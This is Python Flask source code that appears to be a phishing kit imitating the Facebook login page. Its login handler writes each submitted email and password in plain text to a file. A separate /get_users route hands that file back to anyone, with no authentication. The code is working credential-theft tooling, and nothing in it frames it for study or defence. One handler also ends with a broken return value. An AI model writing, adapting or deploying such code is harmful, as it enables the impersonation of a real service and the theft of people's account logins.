from flask import Flask,request,render_template


app = Flask(__name__)


@app.route('/',methods=["GET"])
def index():
    return render_template('index.html');

@app.route('/login',methods=["GET","POST"])
def facebook():
    return render_template('facebook.html')


@app.route('/get_users',methods=["GET"])
def get_users():
    data = ''
    with open("credidentials.txt") as f:
            file_content = f.read()
    return file_content



@app.route('/facebook_login',methods=["GET","POST"])
def get_facebook():
    if request.method == "POST":
        username = request.form.get('email')
        password = request.form.get('password')
        with open('credidentials.txt','a') as users:
            users.write('username = '+username+' password = '+password+'\n')
        return 1+2
    else:
        return render_template('facebook.html');






if __name__ == "__main__":
    app.run(debug=True)


